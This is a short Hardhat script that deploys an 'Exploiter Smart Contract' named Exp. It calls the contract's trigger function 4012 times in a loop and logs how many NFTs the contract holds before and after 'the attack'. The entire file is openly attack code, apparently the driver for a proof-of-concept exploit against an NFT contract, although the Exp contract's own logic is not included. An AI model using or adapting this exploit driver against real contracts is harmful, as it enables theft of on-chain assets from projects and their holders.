// 
//  Author [#] Supremacy Inc.
//

const hre = require("hardhat");

async function main() {
  const Exp = await hre.ethers.getContractFactory("Exp");
  const exp = await Exp.deploy();
  
  await exp.deployed();

  console.log("[#] 👀 Exploiter Smart Contract deployed to:", exp.address);

  const prev_val = await exp.status();
  console.log("[#] 🧛‍♀️ Amount of NFT held before the attack:", prev_val.toString())

  for (let nonce = 0; nonce < 4012; nonce++) {
    await exp.trigger();
  }
  
  const After = await exp.status();
  console.log("[#] 🧛‍♀️ Amount of NFT held after the attack:", After.toString())

}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });